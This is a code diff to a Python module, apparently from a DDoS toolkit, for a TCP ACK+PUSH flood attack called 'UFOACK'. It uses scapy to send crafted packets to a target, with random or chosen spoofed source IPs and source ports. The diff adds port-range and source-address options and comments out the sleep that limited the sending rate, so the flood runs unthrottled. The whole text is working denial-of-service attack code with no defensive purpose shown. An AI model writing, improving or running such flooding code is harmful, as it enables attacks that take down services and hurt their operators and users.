@@ -31,21 +31,28 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def ackize(ip, sport, rounds, source=None):
+def randPort(start, end):
+    x = random.randint(start, end)
+    return x
+
+def ackize(ip, sport, rounds, address_dict):
     n=0
     try:
         for x in range (0,int(rounds)):
             n=n+1
-            s_zombie_port = randInt() 
+            if address_dict['start'] is not None and address_dict['end'] is not None:
+                s_zombie_port = randPort(int(address_dict['start']), int(address_dict['end']))
+            else:
+                s_zombie_port = randInt() 
             seq = randInt()
             window = randInt()
             IP_p = IP()
-            if source is None:
+            if address_dict['source'] is None:
                 print("[Info] [UFOACK] Using random source IP")
                 IP_p.src = randIP()
             else:
                 print("[Info] [UFOACK] Using given source IP")
-                IP_p.src = source
+                IP_p.src = address_dict['source']
             try:
                 IP_p.dst = ip
             except:
@@ -59,15 +66,15 @@ def ackize(ip, sport, rounds, source=None):
             TCP_l.flags = "AP" # FLAGS SET (ACK+PUSH)
             try:
                 send(IP_p/TCP_l, verbose=0)
-                print("[Info] [AI] [UFOACK] Firing 'ionized crystals' ["+str(n)+"] -> [IONIZING!]")
-                time.sleep(1/ACKFLOOD_SPEED) # sleep time required for balanced sucess
+                # print("[Info] [AI] [UFOACK] Firing 'ionized crystals' ["+str(n)+"] -> [IONIZING!]")
+                # time.sleep(1/ACKFLOOD_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [UFOACK] Failed to engage with 'ionized crystals' ["+str(n)+"]")
     except:
         print("[Error] [AI] [UFOACK] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class UFOACK(object):
-    def attacking(self, target, rounds, source = None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] TCP 'ACK+PUSH' (UFOACK) is ready to fire: [" , rounds, "ionized crystals ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -91,4 +98,4 @@ class UFOACK(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [UFOACK] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        ackize(ip, sport, rounds, source) # attack with UFOACK using threading
+        ackize(ip, sport, rounds, address_dict) # attack with UFOACK using threading
